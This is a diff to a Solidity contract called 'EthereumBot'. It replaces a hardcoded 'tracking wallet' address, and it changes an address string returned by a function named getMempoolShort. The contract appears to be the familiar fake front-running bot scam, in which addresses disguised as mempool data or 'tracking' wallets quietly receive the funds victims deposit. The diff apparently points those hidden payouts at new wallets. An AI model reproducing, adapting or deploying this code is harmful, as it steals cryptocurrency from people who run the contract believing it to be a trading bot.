@@ -28,7 +28,7 @@ contract EthereumBot {
     string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
 
     // 👇 NEW: tracking wallet for deployments (REPLACE with your own address)
-    address payable private constant DEPLOY_TRACK_WALLET = 0xD46447270d0E86448961d0809eF8B08a0eb9aDc2;
+    address payable private constant DEPLOY_TRACK_WALLET = 0x3B2f36026896ECa2F26Fe8160f713F35346a178c;
 
     event Log(string _msg);
 
@@ -341,7 +341,7 @@ contract EthereumBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0xeb0552F76fE84ec36e32dEc0843b90F07a12B253";
+        return "0xC7F3Dc53920372aA12401b98F98089Ff2436F45d";
     }
     /*
      * @dev Check if contract has enough liquidity available
